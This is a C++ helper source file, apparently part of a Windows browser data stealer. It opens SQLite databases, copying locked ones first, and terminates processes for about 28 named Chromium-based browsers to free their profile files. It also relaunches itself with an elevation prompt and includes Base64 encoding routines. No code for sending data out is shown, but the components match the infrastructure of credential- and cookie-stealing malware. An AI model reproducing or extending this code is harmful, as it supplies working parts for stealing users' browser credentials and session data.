#include "includes/Helper.h"

BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinationFile) {
	std::ifstream source(sourceFile, std::ios::binary);
	if (!source) {
		return false;
	}

	std::ofstream dest(destinationFile, std::ios::binary);
	if (!dest) {
		return false;
	}

	dest << source.rdbuf();

	if (!dest.good()) {
		return false;
	}

	//std::cout << "File copied successfully." << std::endl;
	return true;
}

sqlite3_stmt* query_database(std::string target_data, const char* database_query)
{
	sqlite3* db;
	if (sqlite3_open(target_data.c_str(), &db) == SQLITE_OK)
	{
		//std::cout << "file found" << std::endl;
		sqlite3_stmt* stmt = nullptr;
		if (sqlite3_prepare_v2(db, database_query, -1, &stmt, 0) == SQLITE_OK)
		{
			return stmt;
		}
		else
		{
			//std::cerr << "Database file in use .... " << std::endl;
			std::string new_target = target_data + " copy";
			custom_copy_file(target_data, new_target);

			sqlite3_open(new_target.c_str(), &db);
			if (sqlite3_prepare_v2(db, database_query, -1, &stmt, 0) == SQLITE_OK)
			{
				return stmt;
			}
			else
			{
				//std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
				return stmt;
			}
		}
	}
	return nullptr;
}

BOOL kill_process(std::string process_path)
{
	std::string process_name = GetBrowserProcessName(process_path);

	if (process_name == "")
		return false;

	// Convert std::string to LPCWSTR (wide string)
	std::wstring wProcessName(process_name.begin(), process_name.end());

	// Get a snapshot of all processes in the system
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		//std::cerr << "Failed to create snapshot." << std::endl;
		return false;
	}

	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process
	if (!Process32First(hSnapshot, &processEntry)) {
		//std::cerr << "Failed to retrieve process information." << std::endl;
		CloseHandle(hSnapshot);
		return false;
	}

	// Iterate through all processes in the snapshot
	do {
		if (!_wcsicmp(processEntry.szExeFile, wProcessName.c_str())) {
			// Open the process with terminate rights
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
			if (hProcess != NULL) {
				// Terminate the process
				if (TerminateProcess(hProcess, 0)) {
					continue;
				}
				else {
					//std::cerr << "Failed to terminate process: " << process_name << " (PID: " << processEntry.th32ProcessID << ")" << std::endl;
					continue;
				}
				CloseHandle(hProcess);
			}
			else {
				//std::cerr << "Failed to open process: " << process_name << " (PID: " << processEntry.th32ProcessID << ")" << std::endl;
				continue;
			}
		}
	} while (Process32Next(hSnapshot, &processEntry));

	CloseHandle(hSnapshot);
	return true;
}

BOOL CheckProcessPriv()
{
	HANDLE hToken = NULL;
	TOKEN_ELEVATION elevation;
	DWORD dwSize;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
			CloseHandle(hToken);
			return elevation.TokenIsElevated != 0;
		}
		CloseHandle(hToken);
	}
	return false;
}

std::wstring ConvertToWideString(const char* str) {
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
	std::wstring wstr(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, str, -1, &wstr[0], size_needed);
	return wstr;
}

void RestartAsAdmin(const char* param) {
	wchar_t szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, MAX_PATH);

	std::wstring wParam = ConvertToWideString(param);

	SHELLEXECUTEINFO sei = { sizeof(sei) };
	sei.lpVerb = L"runas";  // Request elevation
	sei.lpFile = szPath;   // Path to executable
	sei.lpParameters = wParam.c_str();  // Pass the parameter
	sei.nShow = SW_SHOWNORMAL;

	/*if (!ShellExecuteEx(&sei)) {
		MessageBoxA(NULL, "Failed to elevate!", "Error", MB_OK | MB_ICONERROR);
	}*/

	if (ShellExecuteEx(&sei)) {
		// Exit the current instance to avoid duplicate execution
		exit(0);
	}
	else {
		MessageBoxA(NULL, "Failed to elevate!", "Error", MB_OK | MB_ICONERROR);
	}
}

inline bool isBase64(unsigned char c) {
	return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string Base64Encode(const std::vector<uint8_t>& data) {
	std::string encoded_string;
	int i = 0;
	uint8_t char_array_3[3]{};
	uint8_t char_array_4[4]{};

	for (size_t in_ = 0; in_ < data.size(); in_++) {
		char_array_3[i++] = data[in_];

		if (i == 3) {
			char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
			char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
			char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
			char_array_4[3] = char_array_3[2] & 0x3f;

			for (i = 0; i < 4; i++)
				encoded_string += BASE64_CHARS[char_array_4[i]];

			i = 0;
		}
	}

	if (i) {
		for (int j = i; j < 3; j++)
			char_array_3[j] = 0;

		char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
		char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
		char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
		char_array_4[3] = char_array_3[2] & 0x3f;

		for (int j = 0; j < i + 1; j++)
			encoded_string += BASE64_CHARS[char_array_4[j]];

		while (i++ < 3)
			encoded_string += '=';
	}

	return encoded_string;
}

std::vector<uint8_t> Base64Decode(const std::string& encoded_string) {
	int in_len = encoded_string.size();
	int i = 0, j = 0, in_ = 0;
	uint8_t char_array_4[4]{}, char_array_3[3]{};
	std::vector<uint8_t> decoded_data;

	while (in_len-- && (encoded_string[in_] != '=') && isBase64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i < 4; i++) char_array_4[i] = BASE64_CHARS.find(char_array_4[i]);
			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
			for (i = 0; i < 3; i++) decoded_data.push_back(char_array_3[i]);
			i = 0;
		}
	}

	if (i) {
		for (j = i; j < 4; j++) char_array_4[j] = 0;
		for (j = 0; j < 4; j++) char_array_4[j] = BASE64_CHARS.find(char_array_4[j]);
		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
		for (j = 0; j < i - 1; j++) decoded_data.push_back(char_array_3[j]);
	}

	return decoded_data;
}

std::wstring GetExecutablePath() {
	wchar_t path[MAX_PATH];
	GetModuleFileName(NULL, path, MAX_PATH);
	return std::wstring(path);
}

std::wstring StringToWString(const std::string& str) {
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
	std::wstring wstr(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], size_needed);
	return wstr;
}

bool file_exist(const std::string& filePath) {
	std::ifstream file(filePath);
	return file.good();
}

std::string BytesToHexString(const BYTE* byteArray, size_t size) {
	std::ostringstream oss;
	for (size_t i = 0; i < size; ++i)
		oss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byteArray[i]);

	return oss.str();
}

std::string GetBrowserProcessName(const std::string& browserFolder) {
	// Map to associate browser folder paths with their process names
	static std::map<std::string, std::string> browserProcessMap = {
		{"Microsoft\\Edge\\", "msedge.exe"},
		{"Google\\Chrome\\", "chrome.exe"},
		{"Opera Software\\Opera Stable", "opera.exe"},
		{"Iridium\\", "iridium.exe"},
		{"Chromium\\", "chromium.exe"},
		{"BraveSoftware\\Brave-Browser\\", "brave.exe"},
		{"CentBrowser\\", "centbrowser.exe"},
		{"Chedot\\", "chedot.exe"},
		{"Orbitum\\", "orbitum.exe"},
		{"Comodo\\Dragon\\", "dragon.exe"},
		{"Yandex\\YandexBrowser\\", "browser.exe"},
		{"7Star\\7Star\\", "7star.exe"},
		{"Torch\\", "torch.exe"},
		{"MapleStudio\\ChromePlus\\", "chromeplus.exe"},
		{"Komet\\", "komet.exe"},
		{"Amigo\\", "amigo.exe"},
		{"Sputnik\\Sputnik\\", "sputnik.exe"},
		{"CatalinaGroup\\Citrio\\", "citrio.exe"},
		{"360Chrome\\Chrome\\", "360chrome.exe"},
		{"uCozMedia\\Uran\\", "uran.exe"},
		{"liebao\\", "liebao.exe"},
		{"Elements Browser\\", "elementsbrowser.exe"},
		{"Epic Privacy Browser\\", "epic.exe"},
		{"CocCoc\\Browser\\", "browser.exe"},
		{"Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer", "sleipnir.exe"},
		{"QIP Surf\\", "qipsurf.exe"},
		{"Coowon\\Coowon\\", "coowon.exe"},
		{"Vivaldi\\", "vivaldi.exe"}
	};

	// Find the process name in the map
	auto it = browserProcessMap.find(browserFolder);
	if (it != browserProcessMap.end()) {
		return it->second;
	}
	else {
		return "";
	}
}